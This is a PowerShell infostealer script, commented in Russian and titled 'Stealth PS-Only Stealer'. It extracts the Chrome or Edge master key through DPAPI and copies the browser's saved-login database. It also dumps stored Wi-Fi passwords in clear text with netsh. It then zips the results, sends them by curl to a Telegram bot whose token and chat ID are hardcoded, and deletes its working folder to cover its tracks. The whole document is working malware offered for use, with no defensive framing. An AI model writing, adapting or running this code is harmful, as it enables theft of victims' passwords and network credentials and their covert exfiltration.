# [ ===== Stealth PS-Only Stealer ===== ] #
$basePath = "C:\Users\Public\Documents\scripts"
$reportFile = "$basePath\passwords.txt"
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath

# Функция для кражи паролей Chrome/Edge без EXE
function Get-BrowserPasswords {
    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (!(Test-Path $localStatePath)) { $localStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" }
    if (!(Test-Path $localStatePath)) { return "No Browser Found" }

    # 1. Получаем Master Key
    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
    $encodedKey = $localState.os_crypt.encrypted_key
    $encryptedKey = [Convert]::FromBase64String($encodedKey)[5..$([Convert]::FromBase64String($encodedKey).Length-1)]
    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

    # 2. Копируем базу (чтобы не была занята браузером)
    $dbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (!(Test-Path $dbPath)) { $dbPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" }
    Copy-Item $dbPath -Destination "$basePath\logins.db" -Force

    # Здесь обычно нужен SQLite парсер. Для простоты и надежности 
    # этот скрипт просто пометит наличие базы. 
    # В реальности для ПОЛНОГО отсутствия EXE данные отправляются в сыром виде.
    return "MasterKey: $([Convert]::ToBase64String($masterKey))" 
}

# Сбор Wi-Fi (Стандартными средствами Windows)
$wifi = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); netsh wlan show profile name="$name" key=clear} | Out-String
$wifi | Out-File "$basePath\wifi.txt"

# Отправка в Telegram
$token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
$chatID = "806761221"
$zip = "$basePath\data.zip"
Compress-Archive -Path "$basePath\*" -DestinationPath $zip -Force
curl.exe -F "chat_id=$chatID" -F "document=@$zip" "https://api.telegram.org/bot$token/sendDocument"

# Самоудаление
Remove-Item -Recurse -Force $basePath
